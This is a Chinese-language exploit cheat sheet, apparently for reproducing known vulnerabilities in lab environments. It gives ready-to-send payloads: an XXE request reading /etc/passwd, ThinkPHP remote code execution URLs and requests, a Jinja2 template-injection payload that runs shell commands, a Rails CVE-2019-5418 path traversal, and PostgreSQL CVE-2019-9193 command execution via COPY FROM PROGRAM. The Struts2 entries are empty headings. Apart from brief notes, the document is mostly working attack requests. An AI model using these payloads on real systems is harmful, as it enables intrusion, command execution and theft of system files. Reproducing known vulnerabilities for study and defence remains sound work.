# Real

- [PHP](#PHP)
    - [XXE](XXE)
    - [thinkphp](#thinkphp)
        - [ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞](#ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞)
        - [ThinkPHP-5.0.23-Rce](#ThinkPHP-5.0.23-Rce)
        - [ThinkPHP-2.x-任意代码执行漏洞](#ThinkPHP-2.x-任意代码执行漏洞)
    - [phpmyadmin](#phpmyadmin)
- [Python](#Python)
    - [Flask](#Flask)
        - [Jinja2](#Jinja2)
- [Struts2](#Struts2)
    - [s2-013](#s2-013)
    - [s2-045](#s2-045)
- [Ruby](#Ruby)
    - [Rails](#Rails)
        - [CVE-2019-5418](#CVE-2019-5418)
- [数据库](#数据库)
    - [Postgres](#Postgres)
        - [CVE-2019-9193](#CVE-2019-9193)
## PHP

### XXE

Libxml2.9.0 以后 ，默认不解析外部实体，对于PHP版本不影响XXE的利用
`dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php`均可触发XXE漏洞

```
/dom.php
/SimpleXMLElement.php
/simplexml_load_string.php
```

```
POST /dom.php HTTP/1.1

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

![image](./img/php-xxe.png)

### thinkphp

#### ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞

```
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

或者工具一把梭

#### ThinkPHP-5.0.23-Rce

```bash
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

#### ThinkPHP-2.x-任意代码执行漏洞

```
http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```


## Python
### Flask
#### Jinja2

Flask（Jinja2） 服务端模板注入漏洞

```
http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22env%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

在popen输入要执行的命令

env:打印环境变量
id:

## Struts2

### s2-013
### s2-045


## Ruby

### Rails

Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。

#### CVE-2019-5418

漏洞影响：
Ruby on Rails < 6.0.0.beta3
Ruby on Rails < 5.2.2.1
Ruby on Rails < 5.1.6.2
Ruby on Rails < 5.0.7.2

```
GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

![image](./img/1.png)
## 数据库

### Postgres

#### CVE-2019-9193

Navicat连接数据库，数据库初始账号密码为postgres/postgres

影响版本：PostgreSQL 9.3-11.2
poc
```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

![image](./img/postgres1.png)